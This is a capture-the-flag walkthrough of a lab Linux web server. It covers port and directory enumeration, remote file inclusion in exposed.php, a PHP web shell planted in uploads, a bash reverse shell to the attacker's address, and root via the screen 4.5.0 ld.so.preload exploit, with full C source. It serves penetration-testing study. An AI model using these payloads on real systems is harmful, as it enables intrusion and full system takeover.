Haircut

General Information

This section summarizes the basic context of the target machine, including relevant technical details that help understand the environment before starting the enumeration and exploitation process.

  • IP: 10.129.65.98
  • Operating System: Linux (Ubuntu)
  • Web Server: nginx 1.10.0
  • Backend Language: PHP

The machine mainly exposes a web service over HTTP, which directs the initial attack toward web application–level enumeration and exploitation techniques.

Enumeration

Port and service scanning

The enumeration phase focuses on thoroughly understanding the attack surface exposed by the target machine. The goal is not only to identify open services, but also to understand how they may relate to each other in order to build a viable compromise vector.

The first step is to perform a full TCP port scan. For this, nmap is used with a configuration optimized for speed and reliability, disabling DNS resolution and forcing a high packet rate. This allows quick identification of which services are externally accessible. 

sudo nmap -p- -sS -Pn -n --open --min-rate 6500 --max-retries 1 --initial-rtt-timeout 100ms --max-rtt-timeout 300ms -T4 10.129.65.98 -oG allPortsTCP

Once open ports are detected, a more targeted scan is performed against the identified services. This second scan retrieves service versions, banners, and runs basic scripts to better understand the system context. 

nmap -p22,80 -sCV 10.129.65.98 -oN infoPortsTCP

Web and directory enumeration

The results show an SSH service and a web server listening on port 80. When accessing the website, only a static image with no apparent functionality is displayed. No forms, links, or dynamic content are identified that allow direct interaction.

Even though the main page does not provide useful information, this does not mean the web server lacks interesting resources. For this reason, active enumeration continues using directory brute forcing to discover hidden or unlinked paths. 

gobuster dir -u http://10.129.65.98/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -t 200

The scan results are limited, but reveal two relevant paths: index.html and the uploads directory. The latter is particularly interesting, as it is often associated with file upload or storage functionality, potentially opening the door to remote write attacks.

Technologies and exposed files

To complement the information gathered, the technologies used by the web server are identified. This helps confirm the technology stack and better guide the next attack steps. 

whatweb http://10.129.65.98

The analysis confirms that the server is running nginx on Ubuntu and that the backend uses PHP. With this information, it makes sense to search for existing PHP files that are not directly exposed through normal navigation. 

ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://10.129.65.98/FUZZ.php -t 200

This process identifies the exposed.php file. Although it is not linked from visible content, its existence suggests an internal functionality that may be exploitable.

Exploitation

Remote inclusion identification

With exposed.php identified, the next step is to analyze its behavior. When interacting with it, it is observed that it accepts a parameter that allows loading external resources. This behavior is typical of remote inclusion vulnerabilities if proper controls are not implemented.

To validate this hypothesis, a simple HTML file is created on the attacker machine and loaded through the vulnerable parameter. The initial goal is not code execution, but to confirm that the server fetches and renders external content. 

<h1>envertex pwned!</h1>

When making the corresponding request from the browser, the external content is correctly displayed in the server response. This confirms that remote inclusion is possible and that the server trusts attacker-controlled resources.

Remote command execution

Once inclusion is confirmed, the logical next step is to attempt code execution on the server. To do this, the HTML file is replaced with a PHP script that allows system command execution via GET parameters. 

<?php system($_GET['cmd']); ?>

Since the uploads directory was identified during enumeration, it is inferred that the remote resource will be stored there when making the request with output redirection. This allows later direct access to the PHP file from the target server. 

http://10.10.14.194/cmd.php -o uploads/cmd.php

Remote command execution is validated by running whoami from the browser, confirming that the code executes with www-data privileges.

Reverse shell obtainment

With command execution confirmed, a reverse shell is established to gain a more stable interactive session. This facilitates local enumeration and privilege escalation. 

bash -c 'bash -i >& /dev/tcp/10.10.14.194/443 0>&1'

The connection is successfully received on the attacker machine, granting access as www-data. From this context, it is possible to access the home directory of the user maria and read the user flag. 

cat /home/maria/user.txt

Privilege Escalation

SUID binary enumeration

With initial access obtained, the final phase consists of escalating privileges to root. This starts by enumerating binaries with the SUID bit set, as they run with elevated privileges and are a common escalation vector. 

find / -perm -4000 -type f 2>/dev/null

Among the discovered binaries, /usr/bin/screen-4.5.0 stands out. This specific version of screen is known to be vulnerable and has public exploits that allow root-level execution.

Screen vulnerability analysis

When researching this version, a technique abusing the LD_PRELOAD variable is identified to force the loading of a malicious shared library. This library executes with elevated privileges when screen is invoked in a specific way.

During manual exploit implementation, a relevant error appears when attempting to compile the shared library: 

gcc: error trying to exec 'cc1': execvp: No such file or directory

This error is not related to the exploit itself, but to the environment of the www-data user. The limited PATH prevents gcc from correctly locating its internal components. Understanding this detail is crucial, as privilege escalation fails if it is not resolved.

Exploitation and root access

Once the environment is adjusted, a malicious shared library is created. Its purpose is to modify the permissions of a binary that will act as a root shell and clean the ld.so.preload file to avoid system instability. 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
  chown("/tmp/rootshell", 0, 0);
  chmod("/tmp/rootshell", 04755);
  unlink("/etc/ld.so.preload");
  printf("[+] done!\n");
}

In parallel, a simple binary is compiled whose sole purpose is to spawn a shell with UID and GID 0. 

#include <stdio.h>
int main(void){
  setuid(0);
  setgid(0);
  seteuid(0);
  setegid(0);
  execvp("/bin/sh", NULL);
}

Exploitation is completed by using screen to write into ld.so.preload and force the loading of the malicious library. 

cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"

Finally, executing the generated binary yields a root shell. This allows access to the /root directory and reading the final flag, completing full system compromise. 

/tmp/rootshell
cat /root/root.txt
